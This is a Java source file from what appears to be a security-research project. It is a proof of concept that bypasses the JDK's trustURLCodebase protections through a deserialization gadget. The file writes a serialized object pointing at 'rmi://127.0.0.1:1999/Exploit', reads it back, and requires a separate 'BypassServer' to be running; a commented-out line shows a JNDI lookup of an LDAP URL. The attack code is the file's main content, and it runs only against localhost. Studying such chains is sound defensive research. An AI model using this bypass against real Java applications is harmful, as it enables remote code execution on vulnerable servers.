package cn.rui0.idea;


import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.util.Hashtable;

/**
 * Created by ruilin on 2020/2/15.
 * bypass JDK version and support deserialization,please start BypassServer first
 */
public class Gadget3 {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "false");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");

        System.out.println("java.rmi.server.codebase:"+System.getProperty("java.rmi.server.codebase"));
        System.out.println("java.rmi.server.useCodebaseOnly:"+System.getProperty("java.rmi.server.useCodebaseOnly"));
        System.out.println("com.sun.jndi.rmi.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.cosnaming.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
//        Hashtable env = new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
//        Context ctx = new InitialContext(env);
//        Object local_obj = ctx.lookup("ldap://127.0.0.1:1389/fflz1s");


        Gadget2.makeSer("rmi://127.0.0.1:1999/Exploit");

        // start BypassServer first
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("test.ser"));
        Object s = ois.readObject();
        ois.close();

        System.out.printf("breakpoint here");
    }
}
